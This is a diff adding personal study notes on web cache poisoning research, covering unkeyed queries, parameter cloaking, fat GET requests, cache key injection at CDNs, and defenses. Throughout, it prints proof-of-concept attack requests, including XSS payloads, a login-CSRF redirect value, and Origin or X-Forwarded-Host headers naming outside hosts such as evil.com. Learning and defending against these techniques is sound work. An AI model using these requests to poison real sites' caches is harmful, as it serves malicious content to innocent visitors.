@@ -74,4 +74,334 @@ Methodology
 
 Case Studies
 - Unkeyed Query Detection:
-    + 
+    + Scenario:
+        + Most common cache-key transformation is excluding the query string from key
+        + It also difficult to spot because it disguises dynamic pages as static
+        + Can recognize by change value in param and observing different in response
+            GET /?q=canary HTTP/1.1
+            ------------
+            HTTP/1.1 200 OK
+            <link rel="canonical" href="https://example.com/?q=canary"
+        + Even adding extra cache-buster param will have no effect
+            + It will HIT the cached response and no different
+    + Problem:
+        + Unless page clearly indicte when got cache HIT, easy to miss a critical vuln
+        + For vuln scanner, it's worse - they send payload after payload without past the cache (even Param Miner will fail to detect unkeyed headers)
+        + So we need to think about how to pass through cache and hit BE system
+    + Solution:
+        + Sol 1: Cache buster any headers
+            + Edit all headers without significant side-effect and might included in cache key
+            + Example:
+                GET /?q=canary&cachebust=nwf4ws HTTP/1.1
+                Host: example.com
+                Accept-Encoding: gzip, deflate, nwf4ws
+                Accept: */*, text/nwf4ws
+                Cookie: nwf4ws=1
+                Origin: https://nwf4ws.example.com
+            + Work great on some system (like site running Cloudflare include Origin in cache key by default)
+            + Param Miner: can enable this technique by select 'Add static cachebuster' and 'Include cachebusters in headers'
+            + However, in site include none of these headers in cache key and other sites, and cache buster may break things
+        + Sol 2: PURGE / FASTLYPURGE (HTTP method)
+            + Directly delete entries from target's cache without authentication
+            + Useful for live cache poisoning attack, and convenient for punching cache when cache buster failed
+            + However, it can cause race condition and threat to other users of site -> not suitable for automation
+        + Sol 3: Path normalization
+            + Rare for cache to exclude path from cache key
+            + Depend on BE system, can take advantage of path normalization to issue request with different key hit same endpoint
+            + Example: 
+                Apache: //
+                Nginx: /%2F
+                PHP: /index.php/xyz     (/xyz is path info -> ignore)
+                .NET: /(A(xyz))/        (old syntax session in url)
+- Unkeyed Query Exploitation:
+    + Apply technique in wild may find some extremly obvious vuln
+    + Example: in online newspaper site, query reflection lead to XSS on every single page
+        GET //?"><script>alert(1)</script> HTTP/1.1
+        ------------
+        <meta property="og:url" content="//redacted-newspaper.net//?x"><script>alert(1)</script>"/>
+        ------------
+        Cache Key: https://redacted-newspaper.net//
+
+        + Query part is not included in cache key -> hide from everybody else
+        + Anyone hit the same path in cache key would receive poisoned response
+        + Reflected XSS + Cache poisoning -> Critical vuln
+    + // avoid affect all visitor (just for safe PoC, nothing else)
+    + Real attack would remove second / and timing request correctly or using PURGE method
+- Redirect DoS:
+    + Scenario: you discover a site where query string is unkeyed, but no XSS vuln -> need to exploit cache vendor's web
+    + Clouflare's login page cloudflare.com/login, redirect users via /login/
+        + Using this as cache oracle, we can quickly confirm they exclude query from cache key
+            GET /login?x=abc HTTP/1.1
+            -----------------
+            HTTP/1.1 301 Moved Permanently
+            Location: /login/?x=abc
+
+            GET /login HTTP/1.1
+            -----------
+            HTTP/1.1 301 Moved Permanently
+            Location: /login/?x=abc
+        + It might not look like it has much exploit potential, but can turn almost anything into DoS threat
+    + DoS attack:
+        + Send payload with query up to maximum request URI length:
+            GET /login?x=very-long-string... HTTP/1.1
+        + When someone visit page, they get redirect with long query string
+            Location: /login/?x=very-long-string...
+        + The extra / forward slash make 1 byte longer, result in being blocked by server
+            HTTP/1.1 414 Request-URI Too Large
+            CF-Cache-Status: MISS
+        + The redirect add a layer of indirection make DoS attack possible
+    + Even page is not cacheable, still can use cache posoning to add malicious param via redirect
+- Patching Redirects:
+    + Cloudflare could easily patched this by tweaking redirect on their own site, but that would have left many of their client vuln
+    + Solution:
+        + Added a global mitigation to disable caching of redirects that reflect the request's query string
+        + This idea mean that if param in request is same as param in Location -> not cache
+    + Bypass: URL Encoding
+        GET /login?x=%6cong-string... HTTP/1.1
+        -------------
+        Location: /login/?x=long-string…
+        CF-Cache-Status: HIT
+    + This bypass has been resolved, but if server applying any other transformation on query before place in Location -> able to bypass mitigation again
+
+
+Cache Parameter Cloaking
+- What if site excluding a specific param (a harmless analytics param like utm_content)
+    + In theory, this is unexploitable if doesn't have any gadgets that reflect entire URL
+    + In practice, we can often exploit URL parsing quirks to trick it into excluding arbitrary param from cache key
+    + Cache parameter cloaking technique:
+        + Start with easy target - regex for Varnish, designed to remove param '_'
+            set req.http.hash_url = regsuball(
+                        req.http.hash_url,
+                        "\?_=[^&]+&",
+                        "?");
+            + regsuball() == replace() in python
+            + \? -> ?
+            + [^&]+ -> more char but != &
+            + find ?_=<value>&
+        + Normal request:
+            GET /search?q=help?!&search=1 HTTP/1.1
+        + Poison request without change cache key:
+            GET /search?q=help?_=payload&!&search=1 HTTP/1.1
+            + Same cache key as normal request but let victim go to malicious cached response
+    + Note: regex leaves behind ? in cache key, only can poison param that contain a question mark
+
+- Akamai:
+    + Notice akamai-transform param appear in some cache key (not all)
+    -> It might be excluded from cache key
+    + Thanks to poor URL parsing -> easy to make cloaked change to arbitrary param
+        GET /en?x=1&akamai-transform=payload-goes-here HTTP/1.1 (normal)
+        GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1 (poison)
+        -------------
+        X-True-Cache-Key: /L/redacted.akadns.net/en?x=1 vcd=1234 cid=__
+        + Both create same cache key
+    + Fortunately, there's an invisible bit not displayed in any cache key headers (enable if contain akamai-transform param)
+    -> Only work on sites that using akamai-transform deliberately
+
+- Ruby on Rails:
+    + This framework treat ; as a param delimiter (like &)
+    + These request are identical as they only have 1 keyed param - callback
+        GET /jsonp?callback=legit HTTP/1.1
+        GET /jsonp?callback=legit&utm_content=x;callback=alert(1)//
+    + Cache: think utm_content=x;callback=alert(1)// is one param -> ignore from cache key
+    + Rail: think as 3 seperate param, second param prioritize over first
+
+- Unkeyed Method:
+    + Some system don't bother include method in cache key
+    + Another way to hide param from cache key is send POST request:
+        POST /view/o2o/shop HTTP/1.1
+        Host: alijk.m.taobao.com
+
+        _wvUserWkWebView=a</script><svg onload='alert%26lpar;1%26rpar;'/data-
+        --------------
+        HTTP/1.1 200 OK
+        ...
+        "_wvUseWKWebView":"a</script><svg onload='alert&lpar;1&rpar;'/data-"},
+    + Victim send GET requset without body, but cache key not include method, it will serve the poisoned response contain XSS (reflect -> stored XSS)
+    + Aaron Costello discovered this technique same time as James Kettle
+        https://enumerated.wordpress.com/2020/08/05/the-case-of-the-missing-cache-keys/
+
+- Fat GET:
+    + Variation of previous technique work on far more system
+    + Varnish's release notes: 
+    "Whenever a request has a body, it will get sent to the BE for a cache miss ..... the builtin.vcl removes the body for GET requests because it is questionable if GET with a body is valid anyway (but some applications use it)"
+        + if request has a body -> body is sent to BE on a cache miss
+        + builtin.vcl strip body from GET request
+        + Fat GET requests = Varnish without builtin.vcl snippet + framework support GET with body
+    + Github is example of this:
+        + Could use fat GET to poison cache and change any param to any value
+            GET /contact/report-abuse?report=albinowax HTTP/1.1
+            
+            report=innocent-victim
+    + Using same technique was also possible to:
+        + Persistently apply and change issue filters
+        + Deny access to topic pages
+        + Disable 'raw' button on most repos
+- Zendesk:
+    + Not only misconfig Varnish servers forward fat GET request without include body in cache key
+        + All Cloudflare system do the same, as does the Rack:Cache module (cache of Rail system)
+        + Author report but they patched by adding "Do not trust GET request bodies" to their documentation
+            https://developers.cloudflare.com/cache/cache-security/avoid-web-poisoning/
+        + Easy target can find is the site this warning was hosted on (use Zendesk which built on Rails)
+            GET /en-us/signin HTTP/1.1
+            Host: example.zendesk.com
+
+            return_to=/access/logout?return_to=/./access/return_to?flash_digest=secret-token%2526return_to=/final-page?foo=foo%252526bar=bar
+            -------------
+            HTTP/1.1 200 OK
+            ....
+            <input name="return_to" value="/access/logout?return_to=/./access/return_to...">
+
+            + Victim click login page -> type credential -> click login button -> redirect to auth attacker's account
+            + Login CSRF attack
+    + Reported this, but anyone else using Rails behind Cloudflare is likely to still be vuln
+
+
+Gadgets
+- Impact of cache poisoning is hugely dependent on available gadgets
+    + Primitive: possibility of technique that allow to do arbitrary things (like unkeyed change to arbitrary param on cacheable page)
+    + Gadget: all thing that apply primitive can achieve (like XSS, open redirect, login-CSRF, JSONP, ...)
+    + Powerful primitive -> big pool of potential gadget
+    + But quality of the gadget will determine the ultimate impact
+- Gadget in resource file (.css, .js):
+    + Mostly static, but some reflect input from query string
+    + If can inject content to file, will get control over every page that import that resource, even if cross domain
+    + Example: 
+        GET /style.css?x=a);@import... HTTP/1.1
+        ---------------
+        HTTP/1.1 200 OK
+        @import url(/site/home/index-part1.8a6715a2.css?x=a);@import..    
+    + Malicious CSS can exfiltrates sensitive information from any page load it
+    
+    + If contain <!DOCTYPE html> -> standard mode -> check content-type -> if not text/css ignore import else import
+    + If missing <!DOCTYPE html> -> quirks mode -> skip check content-type -> walk through file until see valid CSS -> Execute
+    + Example:
+        GET /foo.css?x=alert(1)%0A{}*{color:red;} HTTP/1.1
+        --------------------
+        HTTP/1.1 200 OK
+        Content-Type: text/html
+
+        This request was blocked due to… alert(1)
+        {}*{color:red;}
+    + Poison CSS files by triggering a server error that reflect the URL
+
+
+Cache Key Normalization
+- URL normalization can have serious consequences when applied to a cache key
+- Case study: FireFox's update system
+    + Browser periodically check for update by issuing a request to download.mozilla.org
+        GET /?product=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1
+        Host: download.mozilla.org
+
+        HTTP/1.1 301 Found
+        Location: https://download-installer.cdn.mozilla.net/pub/..firefox-73.mar
+    + Server config:
+        server {
+            proxy_cache_key $http_x_forwarded_proto$proxy_host$uri$is_args$args;
+            location / {
+                proxy_pass http://upstream_bouncer;
+            }
+        }
+        + proxy_cache_key = scheme + host + URI +  query
+        + No issue in cache key, similar to default
+        + But in proxy_pass:
+            "If proxy_pass is specified without a URI, the request URI is passed to the server in the same form as sent by a client when the original request is processed"
+            https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass
+            + Forwarded request to BE won't be normalized
+            + Request in cache key will be normalized, full URL-decode
+    + Exploit: Send request with encoded question mark
+        GET /%3fproduct=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1
+        --------------
+        HTTP/1.1 301 Found
+        Location: https://www.mozilla.org/
+        + BE result in broken redirect
+        + But in cache server, it decode before calculate key -> success save key of request
+        + Victim click open page -> broken redirect -> Firefox fail to update globally
+        -> Could lead to critical security issues
+
+
+Cache Magic Tricks
+- Sometimes enable 'click here to pwned' attack
+- Encoded XSS:
+    + Expected: GET /?x="/><script>alert(1)</script> HTTP/1.1
+    + Actually: GET /?x=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
+    + Modern browser URL-encode characters before issuing request to BE
+    + But cache decode before calculate cache key 
+    -> 2 requests have same key
+    -> can simply apply cache poisoning then send direct to victim
+- Cache Key Injection - Akamai:
+    + Vuln affecting keyed headers, XSS in Origin header:
+        GET /?x=2 HTTP/1.1
+        Origin: '-alert(1)-'
+        -----------
+        HTTP/1.1 200 OK
+        X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'
+
+        <script>…'-alert(1)-'…</script>
+    + This might be unexploitable, but what if Akamai bundle all key components into string without bothering to escape delimiters
+    + 2 requests with same cache key
+        GET /?x=2 HTTP/1.1
+        Origin: '-alert(1)-'__
+        ------------
+        GET /?x=2__Origin='-alert(1)-' HTTP/1.1
+    + Exploit: issuing the first request ourselves, then directing our victim to the second URL -> XSS exploitable
+    + Can get full control every web using the target CDN
+- Cache Key Injection - Cloudflare:
+    + Default cache key in Cloudflare:
+        ${header:origin}::${scheme}://${host_header}${uri}
+        https://developers.cloudflare.com/cache/how-to/cache-keys/
+    + Mean that these request have the same cache key:
+        GET /foo.jpg?bar=x HTTP/1.1
+        Host: example.com
+        Origin: http://evil.com::http://example.com/foo.jpg?bar=x
+        -------------
+        GET /foo.jpg?bar=argh::http://example.com/foo.jpg?bar=x HTTP/1.1
+        Host: example.com
+        Origin: http://evil.com
+    + In final, issue patched by escaping delimiters
+- Relative Path Overwrite:
+    + https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities
+
+
+Internal Cache Poisoning
+- On opposite, some attack are so practical it's impossible to perform them safely
+- Example: Adobe's blog
+    + Author send this request:
+        GET /access-the-power-of-adobe-acrobat?dontpoisoneveryone=1 HTTP/1.1
+        Host: theblog.adobe.com
+        X-Forwarded-Host: collaborator-id.psres.net    
+    + Received flood of traffic to Burp Collaborator server, originating from all over their website
+    + It turned out that they were using an integrated application-level cache called WP Rocket Cache
+        + Because it often cache fragments of responses individually and don't really have the concept of a cache key
+        -> Sending that request would poisoned every page on site and all pointed to Burp domain
+    + As there no way to undo the attack, best way is just turned off Collaborator server then reached out to Adobe's security team
+    + When it come to internal cache poisoning, the distinction between legitimate hackers and not legitimate can get a little blury
+- Blind Cache Poisoning:
+    + Idea: internal cache don't have cache key -> can poison page you don't have access to
+    + Discover by accident while evaluating DoS technique that universally failed, but trigger traffic to author's server from internal admin panel located on US Department of Defence intranet
+        + Normal behavior: internal site only -> external access triggered a server-level redirect to the intranet
+        + DoS technique: broken that redirect -> trigger error page -> poisoned the internal cache in processed -> all traffic redirect to author's server
+- Recognizing Internal Cache Poisoning:
+    + Author made numerous attempts to find safe way to search for internal cache poisoning, but all terrible
+    + Easy trigger by accident, but it's worth knowing how to recognize the effect (missclssification can result in huge waste of time)
+    + External cache saves full sponse, interal cache only saves fragment
+        + Both old and new canaries appear in a single response
+        + Canaries appear on different page from the one you injected
+        + Inconsistent hostname that resolve to the same application
+    + Safety tip: whenever set a hostname, make sute it's a domain you can control
+
+
+Tooling
+- Param Miner: open source Burp Suite extension helping detect these issues
+    + Can use 'Add cachebuster' option: to add static or dynamic header-based cache busters to all traffic
+    + Help unmask dynamic pages, reduce chance of accidentally affecting other users
+    + Scan for many of cache-key issues, detect Fat GET vuln on a system running Rack::Cache
+    + Core functionality is discovering unlinked param, automatically probe those to identify if they are in cache key
+
+Defense
++ Avoid ever rewriting cache key. Instead, rewrite the actual request - this achieves same performance gains while massively reducing the likelihood of cache poisoning problems
++ Ensure application doesn't support fat GET requests
++ Defense in depth, patch vuln that are deemed unexploitable due to browser constraints, like self-XSS, encoded-XSS, or input reflection in a resource file
+
+Conclusion
+- Web caches have escaped serious scrutiny for years, the diversity of caching issue discovered during this research suggest that there are plenty of undiscovered flaw
+- Alongside HTTP Request Smuggling, another example of flaws arising from complex interaction between separate system, which largely evade detection during both static analysis and white-box testing, then pop up in the production environment
